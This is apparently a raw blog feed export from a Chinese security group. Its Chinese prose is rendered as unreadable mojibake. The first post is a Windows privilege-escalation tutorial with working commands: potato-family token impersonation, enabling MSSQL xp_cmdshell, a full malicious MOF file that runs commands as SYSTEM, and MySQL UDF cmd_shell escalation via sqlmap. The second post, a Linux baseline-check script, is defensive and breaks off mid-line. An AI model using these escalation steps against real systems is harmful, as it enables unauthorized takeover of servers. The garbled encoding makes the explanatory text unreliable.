class="line">https:&#x2F;&#x2F;github.com&#x2F;breenmachine&#x2F;RottenPotatoNG&#x2F;</span><br></pre></td></tr></table></figure><p>RottenPotato(çƒ‚åœŸè±†ï¼‰ææƒçš„åŸç†å¯ä»¥ç®€è¿°å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">æ¬ºéª— â€œNT AUTHORITY\SYSTEMâ€è´¦æˆ·é€šè¿‡NTLMè®¤è¯åˆ°æˆ‘ä»¬æ§åˆ¶çš„TCPç»ˆç«¯ã€‚</span><br><span class="line"></span><br><span class="line">å¯¹è¿™ä¸ªè®¤è¯è¿‡ç¨‹ä½¿ç”¨ä¸­é—´äººæ”»å‡»ï¼ˆNTLMé‡æ”¾ï¼‰ï¼Œä¸ºâ€œNT AUTHORITY\SYSTEMâ€è´¦æˆ·æœ¬åœ°åå•†ä¸€ä¸ªå®‰å…¨ä»¤ç‰Œï¼ˆè¿‡ç¨‹ä¸ºé€šè¿‡ä¸€ç³»åˆ—çš„Windows APIè°ƒç”¨ï¼‰ã€‚</span><br><span class="line"></span><br><span class="line">æ¨¡ä»¿è¿™ä¸ªä»¤ç‰Œï¼Œåªæœ‰å…·æœ‰â€œæ¨¡ä»¿å®‰å…¨ä»¤ç‰Œæƒé™â€çš„è´¦æˆ·æ‰èƒ½å»æ¨¡ä»¿åˆ«äººçš„ä»¤ç‰Œï¼Œä¸€èˆ¬å¤§å¤šæ•°çš„æœåŠ¡å‹è´¦æˆ·ï¼ˆIISã€MSSQLç­‰ï¼‰æœ‰è¿™ä¸ªæƒé™ï¼Œå¤§å¤šæ•°ç”¨æˆ·çº§çš„è´¦æˆ·æ²¡æœ‰è¿™ä¸ªæƒé™ã€‚</span><br></pre></td></tr></table></figure><p>å½“ç„¶åœŸè±†ç³»åˆ—éƒ½ç‰›é€¼classï¼é™„ä¸Šç”œåœŸè±†githubåœ°å€</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;CCob&#x2F;SweetPotato</span><br></pre></td></tr></table></figure><h3 id="6-æ•°æ®åº“ææƒï¼š"><a href="#6-æ•°æ®åº“ææƒï¼š" class="headerlink" title="6.æ•°æ®åº“ææƒï¼š"></a>6.æ•°æ®åº“ææƒï¼š</h3><p>åœ¨windowsä¸Šç»å¸¸ä¼šè£…è¿™ä¸¤ä¸ªæ•°æ®åº“ï¼šsqlserveræ•°æ®åº“ææƒã€MySQLæ•°æ®åº“ææƒ</p><p>æ‰€ä»¥ç›´æ¥é’ˆå¯¹è¿™ä¸¤ä¸ªæ•°æ®åº“è¿›è¡Œææƒã€‚<br>MSSQLææƒï¼š</p><p>å¯ç”¨xp_cmdshellï¼ˆé«˜æƒé™ç”¨æˆ·ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#å…ˆè·å–é«˜æƒé™çš„æ•°æ®åº“ç”¨æˆ·(sysadminï¼‰</span><br><span class="line">æŸ¥æ‰¾ç½‘ç«™æºç æ•°æ®åº“é“¾æ¥æ–‡ä»¶ï¼ˆweb.config &#x2F;conn.asp&#x2F;aspx config.asp &#x2F;aspx dbconfig.asp&#x2F;aspx)ç­‰æ–‡ä»¶ï¼ŒæŸ¥æ‰¾æ•°æ®åº“é“¾æ¥ä¿¡æ¯ï¼ŒæŸ¥æ‰¾å¯è¿›å…¥æ•°æ®åº“çš„ç”¨æˆ·åå’Œå¯†ç </span><br><span class="line"></span><br><span class="line">ç†è®ºä¸Šï¼Œä»€ä¹ˆç”¨æˆ·å¯çš„æ•°æ®åº“ï¼Œxp_cmdshellå°±æ‰§è¡Œä»€ä¹ˆæƒé™</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#çˆ†ç ´å‡ºç”¨æˆ·åå¯†ç ï¼Œæˆ–è€…æ”¶é›†åˆ°å¯†ç ....ç­‰æ‰‹æ®µç™»å…¥æ•°æ®åº“ï¼Œmssqlå¯ä»¥å¤–ç½‘ç™»å½•</span><br><span class="line">select IS_SRVROLEMEMBER(&#39;sysadmin&#39;)#æŸ¥è¯¢æ˜¯å¦ä¸ºsysadminç”¨æˆ·ï¼Œsysadminæ‰§è¡Œå‘½ä»¤ç»§æ‰¿äº†æ•°æ®åº“çš„æƒé™ï¼Œå‰æåœ¨windowsä¸‹ï¼Œæ•°æ®åº“(æ—§ç‰ˆæœ¬ï¼Œæ–°ç‰ˆæœ¬é»˜è®¤é™æƒ)é»˜è®¤æ²¡æœ‰è¢«é™æƒ,é»˜è®¤å°±æ˜¯systemæƒé™</span><br><span class="line">å¦‚æœæœ‰æ³¨å…¥çš„è¯ï¼Œsqlmap --is-dba ä¹Ÿèƒ½åˆ¤æ–­</span><br><span class="line"></span><br><span class="line">#ç„¶ååˆ©ç”¨é«˜æƒé™ç”¨æˆ·æ‰§è¡Œåå¼¹å‘½ä»¤ï¼Œè„šæœ¬ï¼Œæœ¨é©¬ä»€ä¹ˆçš„...</span><br><span class="line">é»˜è®¤cmdçš„ç»„ä»¶ç¦ç”¨ï¼Œå¿…é¡»å®‰è£…cmd_shellç»„ä»¶</span><br><span class="line">EXEC sp_configure &#39;show advanced options&#39;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO </span><br><span class="line">EXEC sp_configure &#39;xp_cmdshell&#39;, 1</span><br><span class="line">GO</span><br><span class="line">RECONFIGURE</span><br><span class="line">GO</span><br><span class="line"></span><br><span class="line">exec master..xp_cmdshell &quot;whoami&quot; --</span><br></pre></td></tr></table></figure><p>MYSQLææƒ</p><p>MOFææƒ<br>ç®€ä»‹ï¼šMOFæ–‡ä»¶æ˜¯mysqlæ•°æ®åº“çš„æ‰©å±•æ–‡ä»¶ï¼ˆåœ¨c:/windows/system32/wbem/mof/nullevt.mofï¼‰å«åšâ€æ‰˜ç®¡å¯¹è±¡æ ¼å¼â€ï¼Œå…¶ä½œç”¨æ˜¯æ¯éš”äº”ç§’å°±ä¼šå»ç›‘æ§è¿›ç¨‹åˆ›å»ºå’Œæ­»äº¡ï¼Œå› ä¸ºMOFæ–‡ä»¶æ¯äº”ç§’å°±ä¼šæ‰§è¡Œï¼Œä¸”æ˜¯ç³»ç»Ÿæƒé™ï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬æœ‰æƒé™æ›¿æ¢åŸæœ‰çš„mofæ–‡ä»¶ï¼Œå°±èƒ½è·å¾—systemæƒé™<br>åˆ©ç”¨æ¡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Windows&lt;&#x3D;2003ï¼ˆè™½ç„¶å¾ˆä¹…è¿œäº†ï¼Œè¿˜æ˜¯æ¸©ä¹ ä¸€ä¸‹ï¼‰</span><br><span class="line"></span><br><span class="line">mysqlåœ¨c:windows&#x2F;system32&#x2F;mofç›®å½•æœ‰å†™æƒé™</span><br><span class="line"></span><br><span class="line">å·²çŸ¥æ•°æ®åº“è´¦å·å¯†ç </span><br></pre></td></tr></table></figure><p>åˆ©ç”¨æ‰‹æ³•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#mysqlè¯­å¥å°†æ¶æ„movæ–‡ä»¶æ›¿æ¢nullevt.mofï¼Œéœ€å…ˆä¸Šä¼ </span><br><span class="line">select load_file(&quot;hacker.mof&quot;) into dumpfile &quot;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mof&quot;</span><br><span class="line"></span><br><span class="line">mofæ–‡ä»¶æ ·æœ¬</span><br><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line">&#123;</span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line">ScriptText &#x3D;</span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;å‘½ä»¤\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line">instance of __FilterToConsumerBinding</span><br><span class="line">&#123;</span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>UDFææƒ<br>ç®€ä»‹ï¼šUDF,user defined funcion,å³ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è‡ªå·±å¢åŠ å‡½æ•°å¯¹mysqlåŠŸèƒ½è¿›è¡Œæ‰©å……ï¼Œæ–‡ä»¶åç¼€ä¸º.dllã€‚<br>åˆ©ç”¨æ¡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">windows2003ã€windowsXPã€windows7</span><br><span class="line">æ‹¥æœ‰mysqlçš„insertå’Œdeleteæƒé™</span><br></pre></td></tr></table></figure><p>æ¼æ´åˆ©ç”¨ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#é¦–å…ˆæˆ‘ä»¬è¦åˆ¤æ–­mysqlç‰ˆæœ¬ï¼Œæ ¹æ®ä¸åŒçš„ç‰ˆæœ¬ï¼š</span><br><span class="line">mysqlç‰ˆæœ¬ &lt; 5.2 , UDFå¯¼å‡ºåˆ°ç³»ç»Ÿç›®å½•c:&#x2F;windows&#x2F;system32&#x2F;</span><br><span class="line">mysqlç‰ˆæœ¬ &gt; 5.2 ï¼ŒUDFå¯¼å‡ºåˆ°å®‰è£…è·¯å¾„MySQL\Lib\Plugin\</span><br><span class="line">ç›´æ¥æŸ¥è¯¢æ’ä»¶å®‰è£…ç›®å½•show variables like %plugin%</span><br><span class="line"></span><br><span class="line">#ä¸Šä¼ udf.dll å°†udf.dllå¯¼å‡ºåˆ°æ’ä»¶ç›®å½•ï¼Œç„¶åæ‰§è¡Œsqlè¯­å¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°,å¹¶åˆ©ç”¨ä»–æ‰§è¡Œå‘½ä»¤ææƒ</span><br><span class="line">create function cmd_shell returns string soname &#39;udf.dll&#39;;#åˆ›å»ºå‡½æ•°</span><br><span class="line">select cmd_shell(&#39;å‘½ä»¤&#39;);#ä½¿ç”¨å‡½æ•°</span><br><span class="line">drop function cmd_shell; #åˆ é™¤å‡½æ•°</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#ä¹Ÿå¯ä»¥è‡ªåŠ¨åŒ–è¿‡ç¨‹ï¼Œä½¿ç”¨sqlmapè‡ªåŠ¨åŒ–ä¸Šä¼ æ’ä»¶</span><br><span class="line">python sqlmap.py -u &#39;xxxx&#39; --file-write&#x3D;&#x2F;lib_mysqludf_sys.so  --file-dest&#x3D;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;</span><br><span class="line">python sqlmap.py -u &#39;xxxx&#39; --sql-shell</span><br></pre></td></tr></table></figure><p>å„ç§CVE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CVE-2016-6663å’ŒCVE-2016-6664,CVE-2016-6663,CVE-2016-6664,CVE-2016-6663,CVE-2016-6664</span><br></pre></td></tr></table></figure><h3 id="7-å…¶ä»–æ‰‹æ³•"><a href="#7-å…¶ä»–æ‰‹æ³•" class="headerlink" title="7.å…¶ä»–æ‰‹æ³•"></a>7.å…¶ä»–æ‰‹æ³•</h3><p>å»å¯»æ‰¾ç³»ç»Ÿé«˜æƒé™è¿è¡Œçš„ç”¨æˆ·ï¼ŒæœåŠ¡ï¼Œè½¯ä»¶ï¼Œç¨‹åºï¼Œè„šæœ¬ï¼Œé€šè¿‡ä¸€å®šæ‰‹æ³•ï¼Œæ¯”å¦‚cveï¼Œè¿›ç¨‹æ³¨å…¥ï¼ŒdllåŠ«æŒï¼Œå®åœ¨ä¸è¡Œç¤¾å·¥</p><blockquote><p>æ‰å®çš„åŸºç¡€+å¥‡å¦™çš„æ€è·¯+æ•æ·çš„æ‰‹æ³•=systemæƒé™</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Gammaå®éªŒå®¤ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windowsææƒ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åœ£è¯ç¤¼ç‰©ä¹‹linuxä¸»æœºå®‰å…¨åŸºçº¿æ£€æŸ¥è„šæœ¬</title>
      <link href="2020/12/25/%E5%9C%A3%E8%AF%9E%E7%A4%BC%E7%89%A9%E4%B9%8Blinux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/"/>
      <url>2020/12/25/%E5%9C%A3%E8%AF%9E%E7%A4%BC%E7%89%A9%E4%B9%8Blinux%E4%B8%BB%E6%9C%BA%E5%AE%89%E5%85%A8%E5%9F%BA%E7%BA%BF%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p><strong>è„šæœ¬å¤åˆ¶ç²˜è´´ä¿å­˜æˆ.shæ–‡ä»¶å³å¯ï¼ŒæŠ¥é”™çš„è¯·aptï¼Œyumä¸‹è½½ç›¸åº”çš„å·¥å…·å—·</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash </span></span><br><span class="line"></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line"><span class="comment"># Linuxä¸»æœºå®‰å…¨åŸºçº¿æ£€æŸ¥</span></span><br><span class="line"><span class="comment"># Date:2020-12-23</span></span><br><span class="line"><span class="comment"># ä½¿ç”¨å‰è¯·ç»™æ–‡ä»¶æ‰§è¡Œæƒé™:chmod u+x check.sh</span></span><br><span class="line"><span class="comment"># å¦‚æç¤ºæ‰¾ä¸åˆ°æ–‡ä»¶ åœ¨viç¼–è¾‘æ¨¡å¼ä¸‹ set ff=uninx</span></span><br><span class="line"><span class="comment"># by Gammaå®‰å…¨å®éªŒå®¤</span></span><br><span class="line"><span class="comment">######################################</span></span><br><span class="line">scanner_time=`date <span class="string">&#x27;+%Y-%m-%d_%H:%M:%S&#x27;</span>`</span><br><span class="line">mkdir Check_log</span><br><span class="line">scanner_log=<span class="string">&quot;./Check_log/checkResult_<span class="variable">$&#123;scanner_time&#125;</span>.log&quot;</span></span><br><span class="line">uptime=$(uptime | sed <span class="string">&#x27;s/.*up \([^,]*\), .*/\1/&#x27;</span>)</span><br><span class="line"><span class="comment">#è°ƒç”¨å‡½æ•°åº“</span></span><br><span class="line">[ -f /etc/init.d/<span class="built_in">functions</span> ] &amp;&amp; <span class="built_in">source</span> /etc/init.d/<span class="built_in">functions</span></span><br><span class="line"><span class="built_in">export</span> PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin</span><br><span class="line"><span class="built_in">source</span> /etc/profile</span><br><span class="line"><span class="comment">#Require root to run this script.</span></span><br><span class="line">[ $(id -u) -gt 0 ] &amp;&amp; <span class="built_in">echo</span> <span class="string">&quot;è¯·ç”¨rootç”¨æˆ·æ‰§è¡Œæ­¤è„šæœ¬ï¼&quot;</span> &amp;&amp; <span class="built_in">exit</span> 1</span><br><span class="line"><span class="comment">#æŠ¥é”™æ—¥å¿—è®°å½•</span></span><br><span class="line">[ -f <span class="variable">$&#123;scanner_log&#125;</span> ] || touch <span class="variable">$&#123;scanner_log&#125;</span></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">getSystemStatus</span></span>()&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> [ -e /etc/sysconfig/i18n ];<span class="keyword">then</span></span><br><span class="line">        default_LANG=<span class="string">&quot;<span class="subst">$(grep <span class="string">&quot;LANG=&quot;</span> /etc/sysconfig/i18n | grep -v <span class="string">&quot;^#&quot;</span> | awk -F &#x27;<span class="string">&quot;&#x27; &#x27;&#123;print <span class="variable">$2</span>&#125;&#x27;)&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="subst">    else</span></span></span><br><span class="line"><span class="string"><span class="subst">        default_LANG=$LANG</span></span></span><br><span class="line"><span class="string"><span class="subst">    fi</span></span></span><br><span class="line"><span class="string"><span class="subst">    export LANG=<span class="string">&quot;en_US.UTF-8&quot;</span></span></span></span><br><span class="line"><span class="string"><span class="subst">    Release=$(cat /etc/redhat-release 2&gt;/dev/null)</span></span></span><br><span class="line"><span class="string">    Kernel=<span class="subst">$(uname -r)</span></span></span><br><span class="line"><span class="string">    OS=<span class="subst">$(uname -o)</span></span></span><br><span class="line"><span class="string">    Hostname=<span class="subst">$(uname -n)</span></span></span><br><span class="line"><span class="string">    SELinux=<span class="subst">$(/usr/sbin/sestatus | grep <span class="string">&quot;SELinux status: &quot;</span> | awk &#x27;&#123;print $3&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">    LastReboot=<span class="subst">$(who -b | awk &#x27;&#123;print $3,$4&#125;&#x27;)</span></span></span><br><span class="line"><span class="string">    uptime=<span class="subst">$(uptime | sed &#x27;s/.*up \([^,]*\), .*/\1/&#x27;)</span></span></span><br><span class="line"><span class="string">    echo &quot;</span>     ç³»ç»Ÿï¼š<span class="variable">$OS</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> å‘è¡Œç‰ˆæœ¬ï¼š<span class="variable">$Release</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>     å†…æ ¸ï¼š<span class="variable">$Kernel</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>   ä¸»æœºåï¼š<span class="variable">$Hostname</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>  SELinuxï¼š<span class="variable">$SELinux</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span>è¯­è¨€/ç¼–ç ï¼š<span class="variable">$default_LANG</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> æ‰«ææ—¶é—´ï¼š$(date +<span class="string">&#x27;%F %T&#x27;</span>)<span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> æœ€åå¯åŠ¨ï¼š<span class="variable">$LastReboot</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    echo &quot;</span> è¿è¡Œæ—¶é—´ï¼š<span class="variable">$uptime</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    export LANG=&quot;</span><span class="variable">$default_LANG</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">bk_safe()&#123;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo -e &quot;</span>\033[33m********************************Linuxä¸»æœºå®‰å…¨åŸºçº¿æ£€æŸ¥***********************************\033[0m<span class="string">&quot;</span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>***********************`hostname -s` ä¸»æœºå®‰å…¨æ£€æŸ¥ç»“æœ********************************<span class="string">&quot;  &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  getSystemStatus &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span><span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>****************************************************<span class="string">&quot; &gt;&gt; <span class="variable">$&#123;scanner_log&#125;</span></span></span><br><span class="line"><span class="string">  echo &quot;</span>`hostname -s`è´¦å·ç­–ç•¥æ£€æŸ¥ç»“æœ<span 